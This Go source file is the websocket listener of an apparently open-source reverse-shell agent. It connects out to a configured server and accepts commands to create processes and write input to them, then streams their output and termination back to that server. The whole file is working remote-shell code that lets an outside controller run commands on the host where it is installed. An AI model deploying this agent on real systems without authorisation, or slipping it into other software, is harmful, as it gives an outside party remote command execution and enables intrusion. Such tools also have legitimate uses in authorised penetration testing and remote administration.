package listener

import (
	"net/http"

	"github.com/gorilla/websocket"
	"github.com/maxlaverse/reverse-shell/agents/go/handler"
	"github.com/maxlaverse/reverse-shell/common"
	"github.com/maxlaverse/reverse-shell/message"
)

type ws struct {
	baseUrl              string
	processOutput        chan *handler.ProcessOutput
	processTerminated    chan *handler.ProcessTerminated
	input                chan *message.ExecuteCommand
	createProcessChannel chan *message.CreateProcess
	readerClosed         chan struct{}
	connectionLost       chan struct{}
	handler              *handler.Handler
}

func NewWebsocket(baseUrl string) *ws {
	processOutput := make(chan *handler.ProcessOutput)
	processTerminated := make(chan *handler.ProcessTerminated)

	return &ws{
		baseUrl:              baseUrl,
		processOutput:        processOutput,
		processTerminated:    processTerminated,
		input:                make(chan *message.ExecuteCommand),
		createProcessChannel: make(chan *message.CreateProcess),
		readerClosed:         make(chan struct{}),
		connectionLost:       make(chan struct{}),
		handler:              handler.New(processOutput, processTerminated),
	}
}

func (l *ws) Start() error {
	return nil
}

func (l *ws) Listen() {
	ws, _, err := websocket.DefaultDialer.Dial(l.websocketUrl(), http.Header{"Origin": {l.baseUrl}})
	if err != nil {
		common.Logger.Errorf("Failed to establish connection: %s", err)
		return
	}

	if len(l.handler.Sessions()) > 0 {
		common.Logger.Debugf("Sending list of active sessions (%d)", len(l.handler.Sessions()))
		send(ws, message.SessionTable{Sessions: l.handler.Sessions()})
	}

	go l.pipeFromProcessOutput(ws)
	go l.pipeToProcessInput(ws)

	common.Logger.Infof("Ready and listening for incoming commands")
	for {
		select {
		case m := <-l.input:
			common.Logger.Debugf("Received %d bytes to be sent to process '%s'", len(m.Command), m.Id)
			l.handler.ExecuteCommand(m.Id, m.Command)
		case m := <-l.createProcessChannel:
			processId := l.handler.CreateProcess(m.CommandLine)
			common.Logger.Debugf("Session created for '%s'", m.Id)
			send(ws, message.ProcessCreated{Id: processId, WantedId: m.Id})
		case <-l.readerClosed:
			common.Logger.Debugf("Lost connection. Stopping the pipeFromProcessOutput loop")
			l.connectionLost <- struct{}{}
			common.Logger.Debugf("Main Loop stopped")
			return
		}
	}
}

func (l *ws) websocketUrl() string {
	return "ws" + l.baseUrl[4:] + "/agent/listen"
}

func (l *ws) pipeToProcessInput(ws *websocket.Conn) {
	defer ws.Close()

	for {
		_, m, err := ws.ReadMessage()
		if err != nil {
			common.Logger.Errorf("Error while reading from the websocket: %s", err)
			l.readerClosed <- struct{}{}
			common.Logger.Debugf("Stopping the pipeToProcessInput loop")
			return
		}
		b := message.FromBinary(m)
		switch v := b.(type) {
		case *message.ExecuteCommand:
			l.input <- v
		case *message.CreateProcess:
			l.createProcessChannel <- v
		default:
			common.Logger.Debugf("Received an unknown message type: %v", v)
		}
	}
}

func (l *ws) pipeFromProcessOutput(ws *websocket.Conn) {
PipeLoop:
	for {
		select {
		case a := <-l.processOutput:
			common.Logger.Debugf("Received %d bytes from processOutput for '%s'", len(a.Result), a.Process.Id)
			send(ws, message.ProcessOutput{Id: a.Process.Id, Data: a.Result})

		case a := <-l.processTerminated:
			common.Logger.Debugf("Received a processTerminated signal! Forwarding")
			send(ws, message.ProcessTerminated{Id: a.Process.Id})

		case <-l.connectionLost:
			common.Logger.Debugf("Received a connectionLost signal! Stopping the loop")
			break PipeLoop
		}
	}
}

func send(ws *websocket.Conn, m message.Serializable) {
	ws.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))
}
